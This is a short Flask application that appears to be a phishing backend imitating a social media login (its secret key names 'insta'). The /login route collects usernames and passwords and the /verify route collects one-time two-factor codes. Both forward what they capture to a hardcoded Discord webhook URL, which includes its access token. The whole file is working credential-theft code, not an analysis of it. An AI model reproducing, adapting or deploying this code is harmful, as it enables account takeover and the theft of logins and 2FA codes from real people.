from flask import Flask, render_template, request, session
import requests

app = Flask(__name__)
app.secret_key = "insta_stealth_key"

WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

@app.route('/')
def index(): return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    uid = request.form.get('username')
    pw = request.form.get('password')
    session['uid'] = uid
    requests.post(WEBHOOK_URL, json={"content": f"🚨 **수집**\nID: `{uid}`\nPW: `{pw}`"})
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp = request.form.get('otp_code')
    uid = session.get('uid', 'Unknown')
    requests.post(WEBHOOK_URL, json={"content": f"🔑 **코드: {otp}** (유저: {uid})"})
    return render_template('success.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
